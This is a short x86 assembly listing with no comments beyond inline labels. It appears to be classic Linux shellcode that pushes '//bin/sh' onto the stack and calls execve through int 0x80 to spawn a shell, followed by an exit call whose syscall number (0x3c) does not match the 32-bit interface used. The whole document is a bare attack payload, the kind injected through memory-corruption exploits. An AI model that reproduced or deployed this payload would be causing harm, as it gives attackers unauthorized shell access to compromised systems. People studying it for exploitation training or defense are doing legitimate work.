xor eax, eax
push eax
push "n/sh" ;//bin/sh
push "//bi"
mov ebx, esp ; points to //bin/sh
push eax
push ebx
mov ecx, esp
push eax
mov edx, esp ; points to null
mov al, 0xb
int 0x80
mov al, 0x3c
xor ebx, ebx
int 0x80
